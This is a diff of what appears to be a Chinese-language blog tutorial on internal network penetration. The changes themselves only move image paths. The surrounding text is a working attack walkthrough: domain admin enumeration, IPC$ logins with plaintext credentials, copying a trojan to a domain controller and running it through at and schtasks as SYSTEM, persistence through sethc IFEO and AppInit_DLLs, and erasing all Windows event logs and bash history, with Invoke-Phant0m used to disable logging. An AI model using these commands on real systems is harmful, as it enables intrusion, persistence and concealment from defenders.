 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/016.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/016.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/017.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/017.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net localgroup administrators /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/018.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/018.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 <p> <strong>查询域管理员用户组:</strong></p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain:</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/019.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/019.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Enterprise</span> Admains<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
 
 <p><strong>定位域管理员:</strong><br>   推荐三个工具</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PsLoggedon<span class="hljs-selector-class">.exe</span><br><br>AdFind<span class="hljs-selector-class">.exe</span>  <br><br>PVEFindADUser<span class="hljs-selector-class">.exe</span> -current<br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/020.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/020.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p> <strong>查找域管理进程：</strong><br>   本机检查：</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /<span class="hljs-built_in">domain</span>    <span class="hljs-comment">//获取域管理员列表</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/021.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/021.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/v</span>       <span class="hljs-string">//</span>  列出本机所有进程及进程用户<br></code></pre></td></tr></table></figure>
 
 <p>然后寻找是否有进程所有者为域管理员的进程。</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/022.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/022.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 <p> <strong>查询域控制器的域用户会话：</strong></p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /<span class="hljs-built_in">domain</span>  <span class="hljs-comment">// 收集域控制器的列表</span><br><br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /<span class="hljs-built_in">domain</span>   <span class="hljs-comment">// 收集域管理员列表</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/023.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/023.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>使用 Netsess.exe 查询每个域控制器，收集所有活动域会话的列表，将域管理员列表与活动会话列表交叉引用，以确定哪些 IP 地址具有活动域令牌：</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Netsess<span class="hljs-selector-class">.exe</span> -h<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/024.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/024.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p> <strong>扫描远程系统上运行的任务：</strong><br>前提是目标使用了本地域管理员共享账户</p>
 <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOR /F <span class="hljs-title function_">%i</span> <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">DO</span> @echo [+] <span class="hljs-title function_">%i</span> <span class="hljs-variable">&amp;&amp;</span> @tasklist /V /S <span class="hljs-title function_">%i</span> /U user /P password 2&gt;NUL &gt; <span class="hljs-keyword">output</span>.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-title function_">%n</span> <span class="hljs-keyword">in</span> (names.txt) <span class="hljs-keyword">DO</span> @type <span class="hljs-keyword">output</span>.txt | findstr <span class="hljs-title function_">%n</span> &gt; NUL <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-title function_">%n</span> was found running a process <span class="hljs-keyword">on</span> <span class="hljs-title function_">%i</span> <span class="hljs-variable">&amp;&amp;</span> pause<br></code></pre></td></tr></table></figure>
@@ -512,7 +512,7 @@
 <p>在 PowerShell 中输入 “Get-ExecutionPolicy”，看到为默认Restricted 权限，如果想执行一个 PowerShell 脚本，需要修改 PowerShell 的默认权限为执行权限。</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Executionpolicy <span class="hljs-comment">Unrestricted</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/025.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/025.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p><strong>PowerView 集成在 PowerSploit 工具包中:</strong><br>下载地址为</p>
 <p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
@@ -531,23 +531,23 @@
 <p>具有最高的管理和使用权限，能改变系统所有设置，可以安装和删除程序，能访问计算机上所有的文件。除此之外，它还拥有控制其他用户的权限。</p>
 <p>3)普通用户账户</p>
 <p>某些功能的使用，是受到一定限制的账户，在系统中可以创建多个此类账户，也可以改变其账户类型。该账户可以访问已经安装在计算机上的程序，可以设置自己账户的图片、密码等，但无权更改大多数计算机的设置。<br>案例演示：<br>上传后门文件后我们拿到一台webshell权限：</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/026.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/026.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>systeminfo查看补丁信息：</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/027.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/027.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/%E6%8A%8A%E8%A1%A5%E4%B8%81%E6%94%BE%E5%88%B0%E8%BF%99%E9%87%8C%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E6%BC%8F%E6%B4%9E">https://i.hacking8.com/tiquan/</a></p>
 <p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/%E6%8A%8A%E8%A1%A5%E4%B8%81%E6%94%BE%E5%88%B0%E8%BF%99%E9%87%8C%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E6%BC%8F%E6%B4%9E">把补丁放到这里看一下未修补的漏洞</a></p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/028.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/028.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/029.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/029.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>根据指定exp进行提权操作。</p>
 <p>Windows提权漏洞集合：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
 <p>Linux提权漏洞集合：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
-<h6 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h6><p>​	在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">域控制器</a>的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。</p>
+<h6 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h6><p>​	在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。</p>
 <p> <strong>利用Windows远程连接命令进行横向渗透：</strong></p>
 <p>​		在渗透测试中，拿到目标机器的用户明文密码或者NTLM Hash后，可以用Windows自带的方法对远程目标系统进行命令行下的连接操作，连接远程主机并执行相关命令，也可以通过PTH的方法，将散列值或明文密码传递到目标机器中进行验证<strong>。</strong></p>
 <p> <strong>建立IPC连接:</strong><br>    IPC$(Internet Process Connection) 是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
@@ -555,23 +555,23 @@
 <p>​	通过执行以下命令，我们可以让win7和DC建立IPC连接<br><code>	</code></p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\&lt;DC的IP&gt;\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:<span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.20.5.107\ipc$ <span class="hljs-string">&quot;qwer1234&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> <span class="hljs-comment">//查看当前主机所建立的连接</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/030.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/030.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 
 <p>我们列出DC上C盘的目录:</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dir</span> \\<span class="hljs-number">10.20.5.107</span>\c$<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/031.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/031.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>再如将文件复制到目标主机DC的C盘上面去: (在实战中，我们可以将木马程序复制到目标主机上去)</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> C:\Users\douser\Desktop\<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">10.20</span>.<span class="hljs-number">5.107</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/032.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/032.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>接着使用at命令创建计划任务，让目标主机在指定的时间运行木马程序(从Win8开始不再支持at命令)：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">10.20.5.107</span> <span class="hljs-number">18</span>:<span class="hljs-number">53</span>:<span class="hljs-number">00</span> c:\shell.exe<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/033.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/033.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 <p> <strong>利用 schtasks 命令:</strong><br>利用schtasks命令创建计划任务进行横向移动的操作流程如下:</p>
 <ol>
 <li><p>先与目标主机建立ipc连接。 </p>
@@ -583,19 +583,19 @@
 <p>5.计划任务成功运行后，执行如下命令强制删除该计划任务: schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn “backdoor” &#x2F;f</p>
 </li>
 </ol>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/034.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/034.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>​	遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码，如下: 这样就行了:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s 10.20.5.107 /u Administrator /p qwer1234 /tn backdoor /sc minute /mo 1 /tr c:\loader.exe /ru system /f<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/035.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/035.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/036.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/036.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/037.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/037.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>成功上线炫彩蛇。</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/038.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/038.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p> 利用Impacket网络协议工具包：<br> Impacket网络协议工具包：<br><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br> Impacket网络协议工具包介绍：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p>
 <p>还有很多种横向方法，这里就不一一举例了。</p>
@@ -660,9 +660,9 @@
 <p>在注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options项下添加sethc.exe项，在该项下添加debugger键，值为要执行的程序。这里添加c:\windows\system32\cmd.exe</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v debugger /t REG\_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/039.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/039.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/040.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/040.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>win 10：</p>
 <p>亲测亦可，但是需要管理员权限运行cmd后再执行添加命令。</p>
@@ -705,16 +705,16 @@
 <p>打开记事本并关闭窗口后，主机上线。</p>
 <p>这里有个点，如果是关闭窗口的方式反弹回来的是普通权限，如果是通过任务管理器结束任务的方式反弹回来的是管理员权限。</p>
 <p>windows server 2008 r2 standard：</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/041.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/041.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/042.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/042.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/043.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/043.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>win 10：</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/044.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/044.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/045.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/045.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>(2) 检测： 查看HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit下是否存在异常子项，默认下面是没有任何项的。</p>
 <p>(3) 清除： 删除存在异常的子项。</p>
@@ -725,9 +725,9 @@
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v Appinit\_Dlls /t REG\_SZ /d <span class="hljs-string">&quot;c:\cs.dll&quot;</span> /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v LoadAppInit\_DLLs /t REG\_DWORD /d 0x1 /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v RequireSignedAppInit\_DLLs /t REG\_DWORD /d 0x0 /f</span><br></code></pre></td></tr></table></figure>
 
 <p>启动cmd、计算器即可触发。</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/046.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/046.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/047.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/047.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>win10：</p>
 <p>win10下没有RequireSignedAppInit_DLLs键，只需设置Appinit_Dlls的值为恶意DLL路径，设置LoadAppInit_DLLs的值为1即可。</p>
@@ -755,7 +755,7 @@
 <li><h6 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a><strong>清理痕迹</strong></h6><p><strong>痕迹清理：</strong></p>
 <p>在我们做完一系列的内网渗透操作后，必然会留下一些蛛丝马迹，因此我们需要给自己” 擦屁股 “。</p>
 <p>一键清理痕迹的脚本：（见github）<br>Windows 日志管理工具 wevtutil.exe</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/048.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/048.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>wevtutil 搭配 for 循环清除所有日志</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=\*&quot;</span> %a in (<span class="hljs-string">&#x27;wevtutil.exe el&#x27;</span>) DO wevtutil.exe cl <span class="hljs-string">&quot;%a&quot;</span><br></code></pre></td></tr></table></figure>
@@ -767,7 +767,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell –<span class="hljs-built_in">exec</span> bypass –Command <span class="hljs-string">&quot;&amp; &#123;Import-Module &#x27;C:\Invoke-Phant0m.ps1&#x27;;Invoke-Phant0m&#125;&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>github地址：<a target="_blank" rel="noopener" href="https://github.com/gouduyao/Invoke-Phant0m">https://github.com/gouduyao/Invoke-Phant0m</a></p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/049.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/049.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p> Linux 日志处理<br>history 命令的清除</p>
 <p>history -c  # 删除内存中的所有命令历史</p>
@@ -775,7 +775,7 @@
 <p>rm .bash_history   #删除历史文件中的内容</p>
 <p>HISTZISE&#x3D;0          #通过设置历史命令条数来清除所有历史记录</p>
 <p>系统日志：</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/050.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
